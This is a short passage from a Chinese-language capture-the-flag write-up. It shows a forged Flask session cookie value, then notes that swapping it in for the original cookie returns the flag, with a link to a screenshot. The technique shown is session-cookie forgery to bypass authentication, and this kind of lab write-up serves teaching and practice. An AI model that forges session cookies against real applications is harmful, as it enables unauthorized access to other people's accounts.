#.eJw9kEuLwkAQhP_K0mcPSSQXwYPLxJBAzxDJg5mL-IiJM0kWomJs8b9vrwueq_qrqn7C9jTWlxYW1_FWz2B7PsLiCV97WIC20SRt26FIfCkiDwPjpG1I5qtQ9oWHVUZIxSRp06sYHzo_dppSJ0Xx0L1pkRIfqfExSEhVmYd5Mefbu7EulHHaGmaZGAMpDg-VZ57KS4fUWRTfTokkNLG0qtIkqex03nDWumX_xB7ucWBmFOiq7JSIlvCaweEynrbXH1cPnwlIejIVV7Oa8etWValDgb6KNxxTOhkXf9pcUxTyhNAInnNfvnHnftfUH9KmNCmu_pVh17MAu2N_HmAGt0s9vv8GvgevXziDbf4.ZDJ9sQ.OpV_FBgKUuuMkDB0_yqBftvUt1g
```

替换原来的cookie，得到flag：

![image-20230409165837485](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304091658577.png)

